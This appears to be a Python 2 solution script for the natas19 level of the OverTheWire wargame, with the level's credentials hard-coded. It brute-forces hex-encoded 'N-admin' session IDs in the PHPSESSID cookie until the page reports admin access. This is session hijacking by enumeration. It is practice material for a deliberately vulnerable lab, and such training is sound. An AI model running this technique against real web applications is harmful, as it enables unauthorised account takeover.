import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

url = "http://natas19.natas.labs.overthewire.org"
string = 'You are an admin.'

for i in range(1,641):
	print('id ',i)
	sessid = str(i) + "-admin"
	sessid = sessid.encode('hex')
	cookies = dict(PHPSESSID=sessid)
	r = requests.get(url,auth=auth,cookies=cookies)
	if r.content.find(string) != -1:
		print(r.content)
		break
